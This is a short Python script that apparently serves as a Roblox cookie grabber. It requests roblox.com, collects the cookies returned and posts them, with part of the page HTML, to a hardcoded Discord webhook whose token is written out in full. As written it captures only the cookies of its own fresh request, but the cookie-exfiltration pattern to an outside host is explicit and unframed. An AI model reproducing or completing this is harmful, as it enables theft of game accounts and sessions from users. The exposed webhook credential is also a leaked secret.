import webbrowser
import requests
import json

# URL of the website you want to interact with
url = 'https://www.roblox.com/home'

# Open the URL in the web browser
webbrowser.open(url)

# Make a GET request to fetch the initial cookies
response = requests.get(url)

# Print the cookies received from the server
print("Cookies received:")
for cookie in response.cookies:
    print(f"{cookie.name}: {cookie.value}")

# Use the cookies in a subsequent request
cookies = response.cookies

# Make another request with the cookies
response_with_cookies = requests.get(url, cookies=cookies)

# Print the response content
print("Response with cookies:")
print(response_with_cookies.text)

# Discord webhook URL
webhook_url = 'https://discord.com/api/webhooks/1345842563160211496/Bau8gJU5Cw6CDpHmwYXMMpi3T166rfE-g28MuQVhiUX_tK-E_QM4l75XIGlIY8eQD3YD'

# You can send either the cookies or the HTML content to the Discord server
message = {
    "content": f"Here are the cookies: {str(cookies)}\n\nOr here is the HTML content:\n{response_with_cookies.text[:2000]}"  # Discord message limit is 2000 characters
}

# Send the data to the Discord webhook
response = requests.post(webhook_url, json=message)

# Check if the message was sent successfully
if response.status_code == 204:
    print("Successfully sent the data to Discord.")
else:
    print(f"Failed to send data. Status code: {response.status_code}")
